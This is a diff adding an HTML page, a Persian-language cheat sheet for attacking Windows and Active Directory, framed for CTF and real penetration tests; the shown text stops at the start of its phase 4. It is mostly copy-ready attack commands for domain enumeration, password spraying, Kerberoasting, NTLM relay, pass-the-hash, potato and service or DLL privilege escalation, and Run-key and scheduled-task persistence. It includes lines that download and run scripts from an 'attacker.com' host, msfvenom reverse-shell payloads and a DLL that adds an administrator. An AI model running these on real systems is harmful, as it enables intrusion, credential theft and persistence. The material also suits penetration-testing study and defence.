@@ -1,0 +1,1262 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows & AD Security Ultimate CTF Guide - Final Edition</title>
+    <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <style>
+        :root {
+            --bg-color: #0d1117;
+            --card-bg: #161b22;
+            --border-color: #30363d;
+            --text-color: #c9d1d9;
+            --muted-color: #8b949e;
+            --primary-color: #58a6ff; /* Windows Blue */
+            --accent-color: #79c0ff;  /* Light Blue accent */
+            --warn-color: #e3b341;
+            --danger-color: #f85149;
+            --code-bg: #010409;
+            --hover-bg: #1f2937;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Vazirmatn', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            display: flex;
+            min-height: 100vh;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            width: 300px;
+            background-color: var(--card-bg);
+            border-left: 1px solid var(--border-color);
+            padding: 20px;
+            position: fixed;
+            height: 100vh;
+            overflow-y: auto;
+            flex-shrink: 0;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .sidebar-header {
+            margin-bottom: 20px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 15px;
+        }
+
+        .sidebar-header h1 {
+            color: var(--primary-color);
+            font-size: 1.4rem;
+            text-align: center;
+            margin-bottom: 5px;
+        }
+
+        .sidebar-header p {
+            color: var(--muted-color);
+            font-size: 0.8rem;
+            text-align: center;
+        }
+
+        .search-box {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .search-box input {
+            width: 100%;
+            padding: 10px 15px;
+            background-color: var(--bg-color);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            color: var(--text-color);
+            font-family: 'Vazirmatn', sans-serif;
+            font-size: 0.9rem;
+            transition: all 0.2s;
+        }
+
+        .search-box input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.2);
+        }
+
+        .nav-list {
+            list-style: none;
+            flex: 1;
+            overflow-y: auto;
+        }
+
+        .nav-list li {
+            margin-bottom: 5px;
+        }
+
+        .nav-list li a {
+            color: var(--text-color);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 8px 12px;
+            border-radius: 6px;
+            transition: all 0.2s ease;
+            font-size: 0.9rem;
+            border-right: 3px solid transparent;
+        }
+
+        .nav-list li a:hover {
+            background-color: var(--hover-bg);
+            color: var(--primary-color);
+        }
+
+        .nav-list li a.active {
+            background-color: rgba(88, 166, 255, 0.1);
+            color: var(--primary-color);
+            border-right: 3px solid var(--primary-color);
+            font-weight: bold;
+        }
+
+        .nav-badge {
+            font-size: 0.7rem;
+            background: var(--bg-color);
+            padding: 2px 6px;
+            border-radius: 4px;
+            color: var(--muted-color);
+        }
+
+        /* Main Content */
+        .main-content {
+            margin-right: 300px;
+            padding: 40px;
+            flex: 1;
+            max-width: 1100px;
+        }
+
+        .main-header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid var(--border-color);
+        }
+
+        .main-header h1 {
+            color: var(--primary-color);
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(88, 166, 255, 0.3);
+        }
+
+        .main-header p {
+            color: var(--muted-color);
+            font-size: 1.1rem;
+        }
+
+        /* Tool Sections */
+        .tool-section {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 30px;
+            margin-bottom: 40px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.2);
+            scroll-margin-top: 20px;
+        }
+
+        .tool-title {
+            color: var(--accent-color);
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 15px;
+        }
+
+        /* Badges & Tags */
+        .goal-box {
+            background: rgba(88, 166, 255, 0.1);
+            border: 1px solid rgba(88, 166, 255, 0.2);
+            border-right: 4px solid var(--primary-color);
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 25px;
+            color: var(--primary-color);
+        }
+
+        .sub-title {
+            color: var(--text-color);
+            margin: 25px 0 15px 0;
+            font-size: 1.2rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .tag {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        .tag-base { background: rgba(88, 166, 255, 0.2); color: var(--primary-color); }
+        .tag-ctf { background: rgba(121, 192, 255, 0.2); color: var(--accent-color); }
+        .tag-tip { background: rgba(227, 179, 65, 0.2); color: var(--warn-color); }
+
+        /* Code Blocks (Terminal Style) */
+        .code-container {
+            position: relative;
+            margin: 15px 0;
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+            background: var(--code-bg);
+        }
+
+        .code-header {
+            background: #161b22;
+            padding: 8px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .code-dots {
+            display: flex;
+            gap: 6px;
+        }
+
+        .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+        }
+        .dot-red { background: #ff5f56; }
+        .dot-yellow { background: #ffbd2e; }
+        .dot-green { background: #27c93f; }
+
+        .code-lang {
+            color: var(--muted-color);
+            font-size: 0.8rem;
+            font-family: monospace;
+        }
+
+        .copy-btn {
+            background: transparent;
+            color: var(--muted-color);
+            border: 1px solid var(--border-color);
+            padding: 4px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.75rem;
+            transition: all 0.2s;
+            font-family: 'Vazirmatn', sans-serif;
+        }
+
+        .copy-btn:hover {
+            background: var(--primary-color);
+            color: #000;
+            border-color: var(--primary-color);
+        }
+
+        pre {
+            background-color: var(--code-bg) !important;
+            padding: 15px !important;
+            border-radius: 0;
+            overflow-x: auto;
+            margin: 0;
+            direction: ltr;
+            text-align: left;
+            max-height: 600px;
+        }
+
+        code {
+            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+
+        /* Table Styles */
+        .table-container {
+            overflow-x: auto;
+            margin: 20px 0;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: var(--card-bg);
+        }
+
+        th, td {
+            padding: 12px 15px;
+            text-align: right;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        th {
+            background-color: var(--bg-color);
+            color: var(--primary-color);
+            font-weight: bold;
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        tr:hover td {
+            background-color: var(--hover-bg);
+        }
+
+        /* Checklist & Special Blocks */
+        .checklist-box {
+            background: rgba(121, 192, 255, 0.05);
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+        .checklist-box ul {
+            list-style: none;
+        }
+        .checklist-box li {
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+        }
+        .checklist-box li::before {
+            content: "☐";
+            color: var(--primary-color);
+            font-size: 1.2rem;
+            margin-left: 10px;
+        }
+
+        .tip-box {
+            background: rgba(227, 179, 65, 0.05);
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+        .tip-box ol {
+            padding-right: 20px;
+        }
+        .tip-box li {
+            margin-bottom: 10px;
+        }
+
+        /* Responsive */
+        @media (max-width: 1024px) {
+            body { flex-direction: column; }
+            .sidebar {
+                position: relative;
+                width: 100%;
+                height: auto;
+                border-left: none;
+                border-bottom: 1px solid var(--border-color);
+            }
+            .main-content {
+                margin-right: 0;
+                padding: 20px;
+                width: 100%;
+            }
+            .nav-list { max-height: 200px; }
+        }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg-color); }
+        ::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--primary-color); }
+    </style>
+</head>
+<body>
+
+    <!-- Sidebar -->
+    <aside class="sidebar">
+        <div class="sidebar-header">
+            <h1>🏛️ WINDOWS & AD</h1>
+            <p>Ultimate CTF Guide - Final</p>
+        </div>
+        <div class="search-box">
+            <input type="text" id="searchInput" placeholder="🔎 جستجوی فاز..." oninput="filterTools()">
+        </div>
+        <ul class="nav-list" id="navList">
+            <li><a href="#intro">🎯 هدف نهایی <span class="nav-badge">Goal</span></a></li>
+            <li><a href="#phase0">فاز ۰: آماده‌سازی <span class="nav-badge">Setup</span></a></li>
+            <li><a href="#phase1">فاز ۱: Domain Enum <span class="nav-badge">Recon</span></a></li>
+            <li><a href="#phase2">فاز ۲: Auth Attacks <span class="nav-badge">Kerberos</span></a></li>
+            <li><a href="#phase3">فاز ۳: Win PrivEsc <span class="nav-badge">Root</span></a></li>
+            <li><a href="#phase4">فاز ۴: Advanced AD <span class="nav-badge">DCSync</span></a></li>
+            <li><a href="#phase5">فاز ۵: Detection <span class="nav-badge">Defend</span></a></li>
+            <li><a href="#checklist">چک‌لیست نهایی <span class="nav-badge">100%</span></a></li>
+            <li><a href="#tips">نکات طلایی <span class="nav-badge">Pro</span></a></li>
+            <li><a href="#scenarios">سناریوهای عملی <span class="nav-badge">CTF</span></a></li>
+            <li><a href="#tools_tbl">ابزارهای ضروری <span class="nav-badge">Tools</span></a></li>
+        </ul>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <header class="main-header">
+            <h1>چیت‌شیت فوق‌جامع امنیت ویندوز و اکتیودایرکتوری</h1>
+            <p>نسخه نهایی و ایمن برای مسابقات حرفه‌ای CTF - نمایش کدها بدون اجرا</p>
+        </header>
+
+        <!-- Intro -->
+        <section id="intro" class="tool-section">
+            <h2 class="tool-title">🎯 هدف نهایی</h2>
+            <div class="goal-box">
+                تسلط کامل بر نفوذ به محیط‌های ویندوزی، شناسایی دامنه، حملات احراز هویت، افزایش دسترسی و تسلط بر اکتیو دایرکتوری در مسابقات CTF و تست‌نفوذ واقعی.
+            </div>
+        </section>
+
+        <!-- Phase 0 -->
+        <section id="phase0" class="tool-section">
+            <h2 class="tool-title">📋 فاز ۰: آماده‌سازی محیط و ابزارها</h2>
+            
+            <h3 class="sub-title">۱. ابزارهای ضروری در کالی لینوکس</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># نصب ابزارهای اصلی
+apt-get install crackmapexec impacket-scripts bloodhound neo4j responder smbclient enum4linux ldapsearch windapsearch kerbrute
+
+# ابزارهای ویندوزی (برای انتقال به هدف)
+# SharpHound.exe, Mimikatz.exe, Rubeus.exe, Seatbelt.exe, SharpUp.exe, PowerSploit, Nishang</code></pre>
+            </div>
+
+            <h3 class="sub-title">۲. شناسایی اولیه دامنه</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># پیدا کردن Domain Controller
+nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local
+nslookup domain.local
+
+# شناسایی DNS
+dig domain.local ANY
+host -t SRV _ldap._tcp.domain.local
+
+# شناسایی با nmap
+nmap -p 88,389,445,636,3268,3269 -sC -sV domain.local
+nmap -p 88,389,445,636,3268,3269 -sC -sV 192.168.1.10
+
+# شناسایی با crackmapexec
+crackmapexec smb domain.local
+crackmapexec ldap domain.local</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 1 -->
+        <section id="phase1" class="tool-section">
+            <h2 class="tool-title">🏛️ فاز ۱: شناسایی دامنه (Domain Enumeration)</h2>
+            
+            <h3 class="sub-title">۱. دستورات پایه ویندوز (روی سیستم قربانی)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">cmd</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># اطلاعات سیستم
+systeminfo
+hostname
+whoami
+whoami /all
+ipconfig /all
+
+# اطلاعات دامنه
+net view
+net view /domain
+net view /domain:DOMAIN
+nltest /domain_trusts
+nltest /dclist:DOMAIN
+
+# کاربران و گروه‌ها
+net user
+net user /domain
+net user username /domain
+net group
+net group /domain
+net group "Domain Admins" /domain
+net group "Domain Controllers" /domain
+net group "Enterprise Admins" /domain
+
+# کامپیوترهای دامنه
+net group "Domain Computers" /domain
+net group "Domain Controllers" /domain
+
+# سیاست‌ها و تنظیمات
+gpresult /r
+gpresult /z
+gpresult /scope computer /v
+
+# اشتراک‌ها
+net share
+net use
+
+# Firewall و سرویس‌ها
+netsh advfirewall show allprofiles
+sc query
+wmic service list brief
+
+# Task Scheduler
+schtasks /query /fo LIST /v
+schtasks /query /fo LIST /v | findstr /i "domain admins"</code></pre>
+            </div>
+
+            <h3 class="sub-title">۲. ابزارهای شناسایی پیشرفته</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># enum4linux (SMB enumeration)
+enum4linux -a domain.local
+enum4linux -U domain.local
+enum4linux -S domain.local
+enum4linux -G domain.local
+enum4linux -P domain.local
+enum4linux -u username -p password domain.local
+
+# crackmapexec (CME)
+crackmapexec smb domain.local -u 'username' -p 'password' --users
+crackmapexec smb domain.local -u 'username' -p 'password' --groups
+crackmapexec smb domain.local -u 'username' -p 'password' --computers
+crackmapexec smb domain.local -u 'username' -p 'password' --pass-pol
+crackmapexec smb domain.local -u 'username' -p 'password' --shares
+crackmapexec smb domain.local -u users.txt -p passwords.txt --continue-on-success
+
+# ldapsearch (LDAP query)
+ldapsearch -x -H ldap://domain.local -D "CN=user,DC=domain,DC=local" -w password -b "DC=domain,DC=local"
+ldapsearch -x -H ldap://domain.local -D "user@domain.local" -w password -b "DC=domain,DC=local" "(&amp;(objectClass=user))" -E pr=1000
+ldapsearch -x -H ldap://domain.local -D "user@domain.local" -w password -b "DC=domain,DC=local" "(objectClass=group)"
+
+# windapsearch
+windapsearch -d domain.local --dc-ip 192.168.1.10 -u username -p password --users
+windapsearch -d domain.local --dc-ip 192.168.1.10 -u username -p password --groups
+windapsearch -d domain.local --dc-ip 192.168.1.10 -u username -p password --full</code></pre>
+            </div>
+
+            <h3 class="sub-title">۳. PowerView (PowerShell)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">powershell</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-powershell"># دانلود و اجرا
+IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/PowerView.ps1")
+
+# Enumeration
+Get-NetDomain
+Get-NetDomainController
+Get-NetUser
+Get-NetUser -Username admin
+Get-NetGroup
+Get-NetGroup -GroupName "Domain Admins"
+Get-NetComputer
+Get-NetComputer -Ping
+Get-NetSession -ComputerName target
+Get-NetShare
+Get-NetFileServer
+Get-NetOU
+Get-NetGPO
+Get-NetGroupMember -GroupName "Domain Admins"</code></pre>
+            </div>
+
+            <h3 class="sub-title">۴. BloodHound (پیشرفته)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># جمع‌آوری داده‌ها با SharpHound (روی ویندوز)
+.\SharpHound.exe -c All
+.\SharpHound.exe -c All -d domain.local
+.\SharpHound.exe -c All --ldapusername domain.local\\user --ldappassword password
+
+# با PowerShell
+Invoke-BloodHound -CollectionMethod All
+
+# جمع‌آوری داده‌ها از لینوکس
+bloodhound-python -u username -p password -d domain.local -ns 192.168.1.10 -c All
+
+# تحلیل با BloodHound (GUI)
+apt-get install neo4j
+neo4j start
+bloodhound
+
+# Query های مهم در BloodHound:
+# 1. Find all Domain Admins
+# MATCH (n:User {admin:true}) RETURN n
+#
+# 2. Shortest path to Domain Admins
+# MATCH (n:User {name:"USERNAME"}), (d:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN shortestPath((n)-[*1..]-&gt;(d))
+#
+# 3. Find all users with Kerberoasting
+# MATCH (u:User {hasspn:true}) RETURN u
+#
+# 4. Find all computers with unconstrained delegation
+# MATCH (c:Computer {unconstraineddelegation:true}) RETURN c</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 2 -->
+        <section id="phase2" class="tool-section">
+            <h2 class="tool-title">🔑 فاز ۲: حملات احراز هویت</h2>
+            
+            <h3 class="sub-title">۱. Password Spraying (حمله با رمزهای رایج)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># با crackmapexec
+crackmapexec smb domain.local -u users.txt -p 'Password123' --continue-on-success
+crackmapexec smb domain.local -u users.txt -p 'CompanyName123' --continue-on-success
+crackmapexec smb domain.local -u users.txt -p passwords.txt --continue-on-success
+crackmapexec ldap domain.local -u users.txt -p 'Password123' --continue-on-success
+
+# با Kerbrute (Kerberos)
+kerbrute passwordspray -d domain.local --dc 192.168.1.10 users.txt 'Password123'
+kerbrute passwordspray -d domain.local --dc 192.168.1.10 users.txt passwords.txt
+kerbrute userenum -d domain.local --dc 192.168.1.10 userlist.txt
+
+# با Hydra
+hydra -L users.txt -P passwords.txt smb://192.168.1.10
+hydra -L users.txt -P passwords.txt ldap://192.168.1.10</code></pre>
+            </div>
+
+            <h3 class="sub-title">۲. AS-REP Roasting</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># شناسایی کاربران بدون Pre-Authentication
+ldapsearch -x -H ldap://domain.local -b "DC=domain,DC=local" "(&amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" -E pr=1000
+
+# با crackmapexec
+crackmapexec ldap domain.local -u username -p password --asreproast
+
+# با Rubeus (روی ویندوز)
+.\Rubeus.exe asreproast /format:hashcat /outfile:hash.txt
+
+# با impacket
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 192.168.1.10 domain.local/ -request -format hashcat
+
+# کرک کردن AS-REP هش
+hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
+john --format=krb5asrep --wordlist=rockyou.txt hash.txt</code></pre>
+            </div>
+
+            <h3 class="sub-title">۳. Kerberoasting</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># استخراج TGS
+crackmapexec ldap domain.local -u username -p password --kerberoasting kerberoast.txt
+
+# با impacket
+python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 192.168.1.10 domain.local/user:password -request
+
+# با Rubeus (روی ویندوز)
+.\Rubeus.exe kerberoast /format:hashcat /outfile:hash.txt
+
+# با PowerShell
+IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/Invoke-Kerberoast.ps1")
+Invoke-Kerberoast -OutputFormat hashcat | Out-File hash.txt
+
+# کرک کردن TGS
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+john --format=krb5tgs --wordlist=rockyou.txt hash.txt</code></pre>
+            </div>
+
+            <h3 class="sub-title">۴. حملات مبتنی بر NTLM (Responder & Relay)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># LLMNR/NBT-NS Poisoning با Responder
+responder -I eth0 -w -r -d -v
+responder -I eth0 -wrfv -d
+
+# کرک کردن NTLMv2 هش
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+john --format=netntlmv2 --wordlist=rockyou.txt hash.txt
+
+# SMB Relay Attack
+# بررسی SMB Signing
+crackmapexec smb domain.local -u username -p password --smb-signing
+
+# با ntlmrelayx.py
+ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
+ntlmrelayx.py -tf targets.txt -smb2support -c "net localgroup administrators /add user"
+ntlmrelayx.py -tf targets.txt -smb2support -of hashes.txt
+python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t smb://192.168.1.10 -smb2support
+
+# SMB Pass-the-Hash
+crackmapexec smb domain.local -u username -H NTLM_hash
+psexec.py domain.local/user@192.168.1.10 -hashes LM:NTLM
+smbexec.py domain.local/user@192.168.1.10 -hashes LM:NTLM
+wmiexec.py domain.local/user@192.168.1.10 -hashes LM:NTLM
+smbclient //192.168.1.10/share -U username --pw-nt-hash NTLM_hash</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 3 -->
+        <section id="phase3" class="tool-section">
+            <h2 class="tool-title">💻 فاز ۳: ارتقای دسترسی در ویندوز</h2>
+            
+            <h3 class="sub-title">۱. Token Impersonation (جعل توکن)</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># با Metasploit
+use exploit/windows/local/ms16_075_reflection
+use exploit/windows/local/ms16_075_reflection_juicy
+use exploit/windows/local/ms17_010_psexec
+
+# با Juicy Potato (روی ویندوز)
+.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
+.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net localgroup administrators user /add" -t *
+.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t * -c {CLSID}
+
+# با PrintSpoofer
+.\PrintSpoofer.exe -c "whoami"
+.\PrintSpoofer.exe -c "net localgroup administrators user /add"
+.\PrintSpoofer.exe -i -c powershell.exe
+
+# با RoguePotato
+.\RoguePotato.exe -r 192.168.1.50 -e "whoami"
+.\RoguePotato.exe -r 192.168.1.50 -c "{CLSID}" -e "powershell -c whoami"
+
+# با SweetPotato
+.\SweetPotato.exe -a "whoami"
+.\SweetPotato.exe -a "net localgroup administrators user /add"</code></pre>
+            </div>
+
+            <h3 class="sub-title">۲. Service Binary Hijacking</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">cmd</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># شناسایی سرویس‌های آسیب‌پذیر (ویندوز)
+sc query
+sc query state= all
+wmic service get name,displayname,pathname,startname
+
+# با PowerShell
+Get-Service
+Get-CimInstance -ClassName Win32_Service | Select-Object Name,PathName,StartName
+
+# با SharpUp (ابزار)
+.\SharpUp.exe audit
+.\SharpUp.exe audit | Select-String "Unquoted"
+.\SharpUp.exe audit | Select-String "Modifiable"
+
+# Unquoted Service Path:
+# اگر مسیر سرویس بدون کوتیشن باشد مثل:
+# "C:\Program Files\Vulnerable Service\service.exe"
+# می‌توانید فایل‌های زیر را جایگزین کنید:
+# C:\Program.exe
+# C:\Program Files\Vulnerable.exe
+
+# ساخت payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f exe -o service.exe
+
+# جایگزینی
+copy service.exe "C:\Program Files\Vulnerable Service\service.exe"
+
+# یا با PowerShell
+Stop-Service "VulnerableService"
+Start-Service "VulnerableService"
+
+# Service Binary Modification
+icacls "C:\Program Files\Vulnerable\service.exe" /grant Everyone:F
+copy payload.exe "C:\Program Files\Vulnerable\service.exe"
+
+# با sc
+sc config VulnerableService binPath="C:\payload.exe"
+sc config VulnerableService obj= ".\LocalSystem"
+sc stop VulnerableService
+sc start VulnerableService</code></pre>
+            </div>
+
+            <h3 class="sub-title">۳. AlwaysInstallElevated</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">cmd</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># شناسایی (رجیستری)
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# ساخت MSI مخرب
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi -o payload.msi
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f msi -o payload.msi
+
+# اجرا
+msiexec /quiet /qn /i payload.msi</code></pre>
+            </div>
+
+            <h3 class="sub-title">۴. DLL Hijacking</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">cpp</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-cpp">// dllmain.cpp
+#include &lt;windows.h&gt;
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
+        WinExec("cmd /c net localgroup administrators user /add", 0);
+        WinExec("cmd /c whoami &gt; C:\\temp\\whoami.txt", 0);
+    }
+    return TRUE;
+}</code></pre>
+            </div>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># کامپایل با MinGW
+x86_64-w64-mingw32-gcc -shared -o payload.dll dllmain.cpp</code></pre>
+            </div>
+
+            <h3 class="sub-title">۵. Registry & Task Scheduler Hijacking</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">cmd</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># Registry Hijacking
+accesschk.exe -accepteula -kwsvc HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+accesschk.exe -accepteula -kwsvc HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+
+# اضافه کردن به Startup
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v payload /t REG_SZ /d "C:\payload.exe" /f
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v payload /t REG_SZ /d "C:\payload.exe" /f
+
+# Task Scheduler Hijacking
+schtasks /query /fo LIST /v
+schtasks /query /fo LIST /v | findstr /i "SYSTEM"
+schtasks /query /fo LIST /v | findstr /i "Domain Admins"
+
+# تغییر task موجود
+schtasks /change /tn "VulnerableTask" /tr "C:\payload.exe" /ru SYSTEM
+
+# ایجاد task جدید
+schtasks /create /tn "Payload" /tr "C:\payload.exe" /sc ONLOGON /ru SYSTEM</code></pre>
+            </div>
+        </section>
+
+        <!-- Phase 4 -->
+        <section id="phase4" class="tool-section">
+            <h2 class="tool-title">🏢 فاز ۴: حملات پیشرفته AD</h2>
+            
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
